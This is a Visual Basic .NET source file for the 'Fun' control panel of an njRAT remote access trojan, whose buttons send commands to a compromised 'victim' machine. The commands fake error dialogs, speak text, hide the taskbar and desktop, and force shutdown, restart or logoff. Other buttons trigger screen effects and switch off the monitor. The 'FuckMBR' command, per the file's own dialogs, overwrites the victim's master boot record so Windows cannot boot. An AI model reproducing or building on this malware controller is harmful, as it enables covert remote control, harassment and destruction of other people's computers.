Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports WinMM
Imports NJRAT.NJRAT
Imports NJRAT.Class7
Imports System.Runtime.InteropServices


Public Class Fun
    Inherits Form
    Public c As Client
    Private listViewItem_0 As ListViewItem
    Public Sub New()
        Me.listViewItem_0 = Nothing
        Me.InitializeComponent()

    End Sub
    <DllImport("KERNEL32.DLL")>
    Public Shared Sub Beep(ByVal freq As Integer, ByVal dur As Integer)
    End Sub

    Public s As Client

    Private Sub RadioButton3_CheckedChanged(sender As Object, e As EventArgs) Handles Que.CheckedChanged

    End Sub


    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
      
        Me.c.Send("Error" + Class7.string_1 + Me.messageicon + Class7.string_1 + Me.messagebutton + Class7.string_1 + Me.TextBox2.Text + Class7.string_1 + Me.TextBox3.Text)
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.c.Send("Speech" + Class7.string_1 + Me.TextBox1.Text)
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        On Error Resume Next
        Dim testspeech = CreateObject("SAPI.spvoice")
        testspeech.speak(TextBox1.Text)
    End Sub

    Private Sub Button21_Click(sender As Object, e As EventArgs) Handles Button21.Click
        Me.c.Send("ShowTask")
    End Sub

    Private Sub Button22_Click(sender As Object, e As EventArgs) Handles Button22.Click
        Me.c.Send("HideTask")
    End Sub

    Private Sub Button24_Click(sender As Object, e As EventArgs) Handles Button24.Click
        Me.c.Send("HideDesk")
    End Sub

    Private Sub Button23_Click(sender As Object, e As EventArgs) Handles Button23.Click
        Me.c.Send("ShowDesk")
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        Dim checked As Boolean = Me.Err.Checked
        Dim icon As MessageBoxIcon
        If checked Then
            icon = MessageBoxIcon.Asterisk
        Else
            checked = Me.Que.Checked
            If checked Then
                icon = MessageBoxIcon.Question
            Else
                checked = Me.Ast.Checked
                If checked Then
                    icon = MessageBoxIcon.Exclamation
                Else
                    checked = Me.Inf.Checked
                    If checked Then
                        icon = MessageBoxIcon.Hand
                    Else
                        icon = MessageBoxIcon.Asterisk
                    End If
                End If
            End If
        End If
        checked = Me.OK.Checked
        Dim buttons As MessageBoxButtons
        If checked Then
            buttons = MessageBoxButtons.OK
        Else
            checked = Me.YESNO.Checked
            If checked Then
                buttons = MessageBoxButtons.YesNo
            Else
                checked = Me.OKCancel.Checked
                If checked Then
                    buttons = MessageBoxButtons.OKCancel
                Else
                    checked = Me.YesNOCANCEL.Checked
                    If checked Then
                        buttons = MessageBoxButtons.YesNoCancel
                    Else
                        checked = Me.RetryCancel.Checked
                        If checked Then
                            buttons = MessageBoxButtons.RetryCancel
                        Else
                            checked = Me.AbortRetryCancel.Checked
                            If checked Then
                                buttons = MessageBoxButtons.AbortRetryIgnore
                            Else
                                buttons = MessageBoxButtons.OK
                            End If
                        End If
                    End If
                End If
            End If
        End If
        MessageBox.Show(Me.TextBox3.Text, Me.TextBox2.Text, buttons, icon)
    End Sub

    Public ReadOnly Property messageicon As Object
        Get
            Dim checked As Boolean = Me.Err.Checked
            Dim result As Object
            If checked Then
                result = "Error"
            Else
                checked = Me.Que.Checked
                If checked Then
                    result = "Question"
                Else
                    checked = Me.Ast.Checked
                    If checked Then
                        result = "Warning"
                    Else
                        checked = Me.Inf.Checked
                        If checked Then
                            result = "Info"
                        Else
                            result = "Error"
                        End If
                    End If
                End If
            End If
            Return result
        End Get
    End Property

    Public ReadOnly Property messagebutton As Object
        Get
            Dim checked As Boolean = Me.OK.Checked
            Dim result As Object
            If checked Then
                result = "OK"
            Else
                checked = Me.OKCancel.Checked
                If checked Then
                    result = "OKCancel"
                Else
                    checked = Me.YESNO.Checked
                    If checked Then
                        result = "YesNo"
                    Else
                        checked = Me.RetryCancel.Checked
                        If checked Then
                            result = "RetryCancel"
                        Else
                            checked = Me.YesNOCANCEL.Checked
                            If checked Then
                                result = "YesNoCancel"
                            Else
                                checked = Me.AbortRetryCancel.Checked
                                If checked Then
                                    result = "AbortRetryCancel"
                                Else
                                    result = "OK"
                                End If
                            End If
                        End If
                    End If
                End If
            End If
            Return result
        End Get
    End Property

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        Me.c.Send("Piano" + Class7.string_1 + "466")

        If CheckBox1.Checked = True Then
            Beep(466, 300)
        End If
    End Sub

    Private Sub Button16_Click(sender As Object, e As EventArgs) Handles Button16.Click
        Me.c.Send("Piano" + Class7.string_1 + "415")

        If CheckBox1.Checked = True Then
            Beep(415, 300)
        End If
    End Sub

    Private Sub Button9_Click(sender As Object, e As EventArgs) Handles Button9.Click
        Me.c.Send("Piano" + Class7.string_1 + "369")

        If CheckBox1.Checked = True Then
            Beep(369, 300)
        End If
    End Sub

    Private Sub Button17_Click(sender As Object, e As EventArgs) Handles Button17.Click
        Me.c.Send("Piano" + Class7.string_1 + "311")

        If CheckBox1.Checked = True Then
            Beep(311, 300)
        End If
    End Sub

    Private Sub Button11_Click(sender As Object, e As EventArgs) Handles Button11.Click
        Me.c.Send("Piano" + Class7.string_1 + "277")

        If CheckBox1.Checked = True Then
            Beep(277, 300)
        End If
    End Sub

    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
        Me.c.Send("Piano" + Class7.string_1 + "623")

        If CheckBox1.Checked = True Then
            Beep(623, 300)
        End If
    End Sub

    Private Sub Button18_Click(sender As Object, e As EventArgs) Handles Button18.Click
        Me.c.Send("Piano" + Class7.string_1 + "593")

        If CheckBox1.Checked = True Then
            Beep(593, 300)
        End If
    End Sub

    Private Sub Button15_Click(sender As Object, e As EventArgs) Handles Button15.Click
        Me.c.Send("Piano" + Class7.string_1 + "540")

        If CheckBox1.Checked = True Then
            Beep(540, 300)
        End If
    End Sub

    Private Sub Button19_Click(sender As Object, e As EventArgs) Handles Button19.Click
        Me.c.Send("Piano" + Class7.string_1 + "491")

        If CheckBox1.Checked = True Then
            Beep(491, 300)
        End If
    End Sub

    Private Sub Button14_Click(sender As Object, e As EventArgs) Handles Button14.Click
        Me.c.Send("Piano" + Class7.string_1 + "449")

        If CheckBox1.Checked = True Then
            Beep(449, 300)
        End If
    End Sub

    Private Sub Button20_Click(sender As Object, e As EventArgs) Handles Button20.Click
        Me.c.Send("Piano" + Class7.string_1 + "429")

        If CheckBox1.Checked = True Then
            Beep(429, 300)
        End If
    End Sub

    Private Sub Button13_Click(sender As Object, e As EventArgs) Handles Button13.Click
        Me.c.Send("Piano" + Class7.string_1 + "393")

        If CheckBox1.Checked = True Then
            Beep(393, 300)
        End If
    End Sub

    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click
        Me.c.Send("Piano" + Class7.string_1 + "361")

        If CheckBox1.Checked = True Then
            Beep(361, 300)
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Me.c.Send("sht")
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Me.c.Send("rst")
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Me.c.Send("lof")
    End Sub

    Private Sub Button25_Click(sender As Object, e As EventArgs) Handles Button25.Click
        Me.c.Send("rainbow")
    End Sub

    Private Sub Button31_Click(sender As Object, e As EventArgs) Handles Button31.Click
        Me.c.Send("boing")
    End Sub

    Private Sub Button27_Click(sender As Object, e As EventArgs) Handles Button27.Click
        Me.c.Send("LightsOut")
    End Sub

    Private Sub Button26_Click(sender As Object, e As EventArgs) Handles Button26.Click
        Me.c.Send("Flashbang")
    End Sub

    Private Sub Button28_Click(sender As Object, e As EventArgs) Handles Button28.Click
        Me.c.Send("Invert")
    End Sub

    Private Sub Button30_Click(sender As Object, e As EventArgs) Handles Button30.Click
        Me.c.Send("mirror")
    End Sub

    Private Sub Button29_Click(sender As Object, e As EventArgs) Handles Button29.Click
        Me.c.Send("Flip")
    End Sub

    Private Sub Button32_Click(sender As Object, e As EventArgs) Handles Button32.Click
        Me.c.Send("newmouse")
    End Sub

    Private Sub Button34_Click(sender As Object, e As EventArgs) Handles Button34.Click
        Me.c.Send("OpenCD")
    End Sub

    Private Sub Button33_Click(sender As Object, e As EventArgs) Handles Button33.Click
        Me.c.Send("CloseCD")
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            Label2.ForeColor = Color.Green
            Label2.Text = "Enabled"
        Else
            If CheckBox3.Checked = False Then
                Label2.ForeColor = Color.Red
                Label2.Text = "Disabled"
            End If
        End If
    End Sub

    Private Sub Button35_Click(sender As Object, e As EventArgs) Handles Button35.Click

        If Label2.Text = "Enabled" Then

            Dim result As DialogResult = MessageBox.Show("Warning, overwriting the MBR is very destructive and will cause the victims Windows to be unable to boot up. Are you sure you want to do this?", "Warning!", MessageBoxButtons.YesNo)
            If result = DialogResult.No Then
                MessageBox.Show("Cancelled overwriting victims MBR")
            ElseIf result = DialogResult.Yes Then

                Me.c.Send("FuckMBR")
                MessageBox.Show("Victims MBR has been overwritten and PC reset. If nothing happened, check the logs for error reporting.")
            End If

        Else

            If Label2.Text = "Disabled" Then

                Dim result As DialogResult = MessageBox.Show("Warning, overwriting the MBR is very destructive and will cause the victims Windows to be unable to boot up. Are you sure you want to do this?", "Warning!", MessageBoxButtons.YesNo)
                If result = DialogResult.No Then
                    MessageBox.Show("Cancelled overwriting victims MBR")
                ElseIf result = DialogResult.Yes Then

                    Me.c.Send("FuckMBRNR")
                    MessageBox.Show("Victims MBR has been overwritten. If nothing happens, check the logs for error reporting.")
                End If

            End If

        End If

    End Sub

    Private Sub Button37_Click(sender As Object, e As EventArgs) Handles Button37.Click
        Me.c.Send("MonitorON")
    End Sub

    Private Sub Button36_Click(sender As Object, e As EventArgs) Handles Button36.Click
        Me.c.Send("MonitorOFF")
    End Sub

    Private Sub Button38_Click(sender As Object, e As EventArgs) Handles Button38.Click
        Me.c.Send("gradient")
    End Sub

    Private Sub Button39_Click(sender As Object, e As EventArgs) Handles Button39.Click
        Me.c.Send("spooky")
    End Sub

    Private Sub Button40_Click(sender As Object, e As EventArgs) Handles Button40.Click
        Me.c.Send("lines")
    End Sub

    Private Sub Button41_Click(sender As Object, e As EventArgs) Handles Button41.Click
        Me.c.Send("sysicos")
    End Sub
End Class